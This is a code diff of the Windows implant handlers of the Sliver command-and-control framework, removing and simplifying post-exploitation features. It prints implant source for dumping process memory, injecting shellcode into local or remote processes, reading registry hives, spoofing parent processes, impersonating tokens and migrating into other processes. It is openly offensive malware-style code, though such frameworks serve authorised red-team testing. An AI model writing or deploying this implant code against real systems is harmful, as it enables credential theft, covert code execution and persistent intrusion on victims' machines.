@@ -25,7 +25,6 @@ import (
 	"io"
 	"os"
 	"runtime"
-	"strings"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -35,10 +34,7 @@ import (
 	"syscall"
 
 	"github.com/bishopfox/sliver/implant/sliver/extension"
-	"github.com/bishopfox/sliver/implant/sliver/mount"
 	"github.com/bishopfox/sliver/implant/sliver/priv"
-	"github.com/bishopfox/sliver/implant/sliver/procdump"
-	"github.com/bishopfox/sliver/implant/sliver/ps"
 	"github.com/bishopfox/sliver/implant/sliver/registry"
 	"github.com/bishopfox/sliver/implant/sliver/service"
 	"github.com/bishopfox/sliver/implant/sliver/spoof"
@@ -74,7 +70,6 @@ var (
 		sliverpb.MsgExecuteWindowsReq:              executeWindowsHandler,
 		sliverpb.MsgGetPrivsReq:                    getPrivsHandler,
 		sliverpb.MsgCurrentTokenOwnerReq:           currentTokenOwnerHandler,
-		sliverpb.MsgRegistryReadHiveReq:            regReadHiveHandler,
 
 		// Platform specific
 		sliverpb.MsgIfconfigReq:            ifconfigHandler,
@@ -90,10 +85,6 @@ var (
 		sliverpb.MsgRegistryDeleteKeyReq:   regDeleteKeyHandler,
 		sliverpb.MsgRegistrySubKeysListReq: regSubKeysListHandler,
 		sliverpb.MsgRegistryListValuesReq:  regValuesListHandler,
-		sliverpb.MsgServicesReq:            servicesListHandler,
-		sliverpb.MsgServiceDetailReq:       serviceDetailHandler,
-		sliverpb.MsgStartServiceByNameReq:  startServiceByNameHandler,
-		sliverpb.MsgMountReq:               mountHandler,
 
 		// Generic
 		sliverpb.MsgPing:           pingHandler,
@@ -104,25 +95,18 @@ var (
 		sliverpb.MsgPwdReq:         pwdHandler,
 		sliverpb.MsgRmReq:          rmHandler,
 		sliverpb.MsgMvReq:          mvHandler,
-		sliverpb.MsgCpReq:          cpHandler,
 		sliverpb.MsgMkdirReq:       mkdirHandler,
 		sliverpb.MsgExecuteReq:     executeHandler,
 		sliverpb.MsgReconfigureReq: reconfigureHandler,
 		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
 		sliverpb.MsgChtimesReq:     chtimesHandler,
-		sliverpb.MsgGrepReq:        grepHandler,
 
 		// Extensions
 		sliverpb.MsgRegisterExtensionReq: registerExtensionHandler,
 		sliverpb.MsgCallExtensionReq:     callExtensionHandler,
 		sliverpb.MsgListExtensionsReq:    listExtensionsHandler,
 
-		// Wasm Extensions - Note that execution can be done via a tunnel handler
-		sliverpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
-		sliverpb.MsgDeregisterWasmExtensionReq: deregisterWasmExtensionHandler,
-		sliverpb.MsgListWasmExtensionsReq:      listWasmExtensionsHandler,
-
-		// {{if .Config.IncludeWG}}
+		// {{if .Config.WGc2Enabled}}
 		// Wireguard specific
 		sliverpb.MsgWGStartPortFwdReq:   wgStartPortfwdHandler,
 		sliverpb.MsgWGStopPortFwdReq:    wgStopPortfwdHandler,
@@ -162,45 +146,6 @@ func WrapperHandler(handler RPCHandler, data []byte, resp RPCResponse) {
 }
 
 // ---------------- Windows Handlers ----------------
-
-func dumpHandler(data []byte, resp RPCResponse) {
-	procDumpReq := &sliverpb.ProcessDumpReq{}
-	err := proto.Unmarshal(data, procDumpReq)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-	res, err := procdump.DumpProcess(procDumpReq.Pid)
-	dumpResp := &sliverpb.ProcessDump{Data: res.Data()}
-	if err != nil {
-		dumpResp.Response = &commonpb.Response{
-			Err: fmt.Sprintf("%v", err),
-		}
-	}
-	data, err = proto.Marshal(dumpResp)
-	resp(data, err)
-}
-
-func taskHandler(data []byte, resp RPCResponse) {
-	var err error
-	task := &sliverpb.TaskReq{}
-	err = proto.Unmarshal(data, task)
-	if err != nil {
-		// {{if .Config.Debug}}
-		log.Printf("error decoding message: %v", err)
-		// {{end}}
-		return
-	}
-
-	if task.Pid == 0 {
-		err = taskrunner.LocalTask(task.Data, task.RWXPages)
-	} else {
-		err = taskrunner.RemoteTask(int(task.Pid), task.Data, task.RWXPages)
-	}
-	resp([]byte{}, err)
-}
 
 func impersonateHandler(data []byte, resp RPCResponse) {
 	impersonateReq := &sliverpb.ImpersonateReq{}
@@ -375,8 +320,6 @@ func executeWindowsHandler(data []byte, resp RPCResponse) {
 	if execReq.UseToken {
 		cmd.SysProcAttr.Token = syscall.Token(priv.CurrentToken)
 	}
-	// Hide the window if requested
-	cmd.SysProcAttr.HideWindow = execReq.HideWindow
 	if execReq.PPid != 0 {
 		err := spoof.SpoofParent(execReq.PPid, cmd)
 		if err != nil {
@@ -460,7 +403,6 @@ func migrateHandler(data []byte, resp RPCResponse) {
 	log.Println("migrateHandler: RemoteTask called")
 	// {{end}}
 	migrateReq := &sliverpb.InvokeMigrateReq{}
-	var migrateResp sliverpb.Migrate = sliverpb.Migrate{}
 	err := proto.Unmarshal(data, migrateReq)
 	if err != nil {
 		// {{if .Config.Debug}}
@@ -468,60 +410,21 @@ func migrateHandler(data []byte, resp RPCResponse) {
 		// {{end}}
 		return
 	}
-
-	if migrateReq.Pid == 0 {
-		if migrateReq.ProcName == "" {
-			// {{if .Config.Debug}}
-			log.Println("pid nor process name were specified")
-			// {{end}}
-			migrateResp.Success = false
-			migrateResp.Response = &commonpb.Response{}
-		} else {
-			// Search for the PID
-			processes, err := ps.Processes()
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("failed to list procs %v", err)
-				// {{end}}
-				migrateResp.Success = false
-				migrateResp.Response = &commonpb.Response{}
-			} else {
-				for _, proc := range processes {
-					if strings.EqualFold(proc.Executable(), migrateReq.ProcName) {
-						migrateReq.Pid = uint32(proc.Pid())
-						break
-					}
-				}
-				if migrateReq.Pid == 0 {
-					// If the Pid is still zero after grabbing a list of processes, then the process name does not exist
-					// {{if .Config.Debug}}
-					log.Printf("Could not find process with name %s", migrateReq.ProcName)
-					// {{end}}
-					migrateResp.Success = false
-					migrateResp.Response = &commonpb.Response{}
-				}
-			}
+	err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
+	// {{if .Config.Debug}}
+	log.Println("migrateHandler: RemoteTask called")
+	// {{end}}
+	migrateResp := &sliverpb.Migrate{Success: true}
+	if err != nil {
+		migrateResp.Success = false
+		migrateResp.Response = &commonpb.Response{
+			Err: err.Error(),
 		}
-	}
-
-	if migrateResp.Response == nil {
-		err = taskrunner.RemoteTask(int(migrateReq.Pid), migrateReq.Data, false)
 		// {{if .Config.Debug}}
-		log.Println("migrateHandler: RemoteTask called")
+		log.Println("migrateHandler: RemoteTask failed:", err)
 		// {{end}}
-		migrateResp = sliverpb.Migrate{Success: true, Pid: migrateReq.Pid}
-		if err != nil {
-			migrateResp.Success = false
-			migrateResp.Response = &commonpb.Response{
-				Err: err.Error(),
-			}
-			// {{if .Config.Debug}}
-			log.Println("migrateHandler: RemoteTask failed:", err)
-			// {{end}}
-		}
 	}
-
-	data, err = proto.Marshal(&migrateResp)
+	data, err = proto.Marshal(migrateResp)
 	resp(data, err)
 }
 
@@ -597,25 +500,6 @@ func stopService(data []byte, resp RPCResponse) {
 			Err: err.Error(),
 		}
 	}
-	data, err = proto.Marshal(svcInfo)
-	resp(data, err)
-}
-
-func startServiceByNameHandler(data []byte, resp RPCResponse) {
-	startServiceReq := &sliverpb.StartServiceByNameReq{}
-	err := proto.Unmarshal(data, startServiceReq)
-	if err != nil {
-		return
-	}
-
-	err = service.StartServiceByName(startServiceReq.ServiceInfo.Hostname, startServiceReq.ServiceInfo.ServiceName)
-	svcInfo := &sliverpb.ServiceInfo{}
-	if err != nil {
-		svcInfo.Response = &commonpb.Response{
-			Err: err.Error(),
-		}
-	}
-
 	data, err = proto.Marshal(svcInfo)
 	resp(data, err)
 }
@@ -757,28 +641,6 @@ func regValuesListHandler(data []byte, resp RPCResponse) {
 	resp(data, err)
 }
 
-func regReadHiveHandler(data []byte, resp RPCResponse) {
-	hiveReq := &sliverpb.RegistryReadHiveReq{}
-	err := proto.Unmarshal(data, hiveReq)
-	if err != nil {
-		return
-	}
-	hiveResp := &sliverpb.RegistryReadHive{
-		Response: &commonpb.Response{},
-	}
-	hiveData, err := registry.ReadHive(hiveReq.RootHive, hiveReq.RequestedHive)
-	if err != nil {
-		hiveResp.Response.Err = err.Error()
-	}
-	// We might not have a fatal error, so whatever the result (nil or not), assign .Data to it
-	gzipData := bytes.NewBuffer([]byte{})
-	gzipWrite(gzipData, hiveData)
-	hiveResp.Data = gzipData.Bytes()
-	hiveResp.Encoder = "gzip"
-	data, err = proto.Marshal(hiveResp)
-	resp(data, err)
-}
-
 func getPrivsHandler(data []byte, resp RPCResponse) {
 	createReq := &sliverpb.GetPrivsReq{}
 
@@ -822,76 +684,6 @@ func getPrivsHandler(data []byte, resp RPCResponse) {
 	}
 
 	data, err = proto.Marshal(getPrivsResp)
-	resp(data, err)
-}
-
-func servicesListHandler(data []byte, resp RPCResponse) {
-	servicesReq := &sliverpb.ServicesReq{}
-	err := proto.Unmarshal(data, servicesReq)
-	if err != nil {
-		return
-	}
-
-	serviceInfo, err := service.ListServices(servicesReq.Hostname)
-	/*
-		Errors from listing the services are not fatal. The client can
-		display a message to the user about the issue
-		We still want other errors like timeouts to be handled in the
-		normal way.
-	*/
-	servicesResp := &sliverpb.Services{
-		Details:  serviceInfo,
-		Error:    err.Error(),
-		Response: &commonpb.Response{},
-	}
-
-	data, err = proto.Marshal(servicesResp)
-	resp(data, err)
-}
-
-func serviceDetailHandler(data []byte, resp RPCResponse) {
-	serviceDetailReq := &sliverpb.ServiceDetailReq{}
-	err := proto.Unmarshal(data, serviceDetailReq)
-	if err != nil {
-		return
-	}
-
-	serviceDetail, err := service.GetServiceDetail(serviceDetailReq.ServiceInfo.Hostname, serviceDetailReq.ServiceInfo.ServiceName)
-	serviceDetailResp := &sliverpb.ServiceDetail{
-		Detail:   serviceDetail,
-		Response: &commonpb.Response{},
-	}
-	if err != nil {
-		if serviceDetail != nil {
-			// Then we had a non-fatal error
-			serviceDetailResp.Message = err.Error()
-		} else {
-			serviceDetailResp.Response.Err = err.Error()
-		}
-	}
-
-	data, err = proto.Marshal(serviceDetailResp)
-	resp(data, err)
-}
-
-func mountHandler(data []byte, resp RPCResponse) {
-	mountReq := &sliverpb.MountReq{}
-
-	err := proto.Unmarshal(data, mountReq)
-	if err != nil {
-		return
-	}
-	mountData, err := mount.GetMountInformation()
-	mountResp := &sliverpb.Mount{
-		Info:     mountData,
-		Response: &commonpb.Response{},
-	}
-
-	if err != nil {
-		mountResp.Response.Err = err.Error()
-	}
-
-	data, err = proto.Marshal(mountResp)
 	resp(data, err)
 }
 
@@ -957,11 +749,11 @@ func listExtensionsHandler(data []byte, resp RPCResponse) {
 }
 
 // Stub since Windows doesn't support UID
-func getUid(fileInfo os.FileInfo) string {
+func getUid(fileInfo os.FileInfo) (string) {
 	return ""
 }
 
 // Stub since Windows doesn't support GID
-func getGid(fileInfo os.FileInfo) string {
-	return ""
+func getGid(fileInfo os.FileInfo) (string) {
+    return ""
 }
